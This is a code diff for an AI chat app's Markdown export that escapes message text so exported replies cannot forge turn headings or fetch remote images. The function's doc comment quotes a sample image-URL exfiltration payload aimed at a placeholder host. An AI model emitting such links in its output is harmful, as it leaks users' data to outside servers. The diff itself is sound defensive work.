@@ -45,6 +45,16 @@ export function chatExportObject(chat: ChatSnapshot, exportedAt: number): ChatEx
   };
 }
 
+/**
+ * Message text as inert Markdown: every character that could start an image, a link, raw HTML or
+ * code (`\\`, `` ` ``, `<`, `>`, `[`, `]`, `!`) is backslash-escaped, and a `#` opening a line too
+ * (so a reply can't forge a "## You" turn). Opened in a Markdown viewer, a reply such as
+ * `![](https://example.com/?d=…)` or `<img src=…>` shows as the text it is and fetches nothing.
+ */
+export function inertMarkdown(text: string): string {
+  return text.replace(/[\\`<>[\]!]/g, (char) => `\\${char}`).replace(/^([ \t]{0,3})#/gm, '$1\\#');
+}
+
 /** A fence longer than any run of backticks in `text` (at least three), so the block can't be closed from inside. */
 function fenceFor(text: string): string {
   let longest = 0;
@@ -60,20 +70,20 @@ function toolBlock(card: ToolCardSnapshot): string {
   return [`${fence}tool ${card.toolName} (${status}${card.code !== null && card.code !== card.status ? `: ${card.code}` : ''})`, body, fence].join('\n');
 }
 
-/** The Markdown export: a heading, the untrusted-output note, then each turn; tool cards as fenced blocks. */
+/** The Markdown export: a heading, the untrusted-output note, then each turn (its text inert, `inertMarkdown`); tool cards as fenced blocks. */
 export function chatMarkdown(chat: ChatSnapshot, exportedAt: number): string {
-  const lines: string[] = [`# ${chat.title.trim() === '' ? 'Untitled chat' : chat.title}`, ''];
+  const lines: string[] = [`# ${chat.title.trim() === '' ? 'Untitled chat' : inertMarkdown(chat.title)}`, ''];
   lines.push(`Exported from frost on ${iso(exportedAt)}. Last updated ${iso(chat.updatedAt)}.${chat.modelId !== null ? ` Model: ${chat.modelId}.` : ''}`, '');
   lines.push(`> ${CHAT_EXPORT_UNTRUSTED_NOTE}`, '');
   if (chat.truncated) lines.push('_Earlier messages were not kept._', '');
   for (const entry of chat.entries) {
     if (entry.kind === 'user') {
-      lines.push(entry.skill !== undefined ? `## You (skill: ${entry.skill.name})` : '## You', '');
-      if (entry.text !== '') lines.push(entry.text, '');
+      lines.push(entry.skill !== undefined ? `## You (skill: ${inertMarkdown(entry.skill.name)})` : '## You', '');
+      if (entry.text !== '') lines.push(inertMarkdown(entry.text), '');
       continue;
     }
     lines.push('## Agent', '');
-    if (entry.text !== '') lines.push(entry.text, '');
+    if (entry.text !== '') lines.push(inertMarkdown(entry.text), '');
     for (const card of entry.tools) lines.push(`**${toolLabel(card.toolName)}**`, '', toolBlock(card), '');
   }
   return `${lines.join('\n').trimEnd()}\n`;
